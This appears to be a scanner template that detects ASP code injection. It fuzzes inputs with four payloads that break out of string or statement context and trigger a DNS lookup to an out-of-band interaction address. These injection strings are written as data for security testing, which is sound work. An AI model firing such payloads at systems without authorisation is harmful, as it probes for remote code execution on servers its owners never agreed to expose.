id: asp-code-injection-oob
issue_code: asp_code_injection
detection_conditions: or
detection_methods:
  - oob_interaction:
      oob_address: "{{.oob_address}}"
      confidence: 90
vars:
  - name: oob_address
    value: "{{interactionAddress}}"
launch:
  operator: or
  conditions:
    - type: platform
    - type: scan_mode
      value: fuzz
templates:
  - ' System.Net.Dns.GetHostAddresses("{{.oob_address}}")'
  - ;System.Net.Dns.GetHostAddresses("{{.oob_address}}")
  - '";System.Net.Dns.GetHostAddresses("{{.oob_address}}")#'
  - ''';System.Net.Dns.GetHostAddresses("{{.oob_address}}")#'
categories:
  - oob
  - injection
platforms:
  - asp
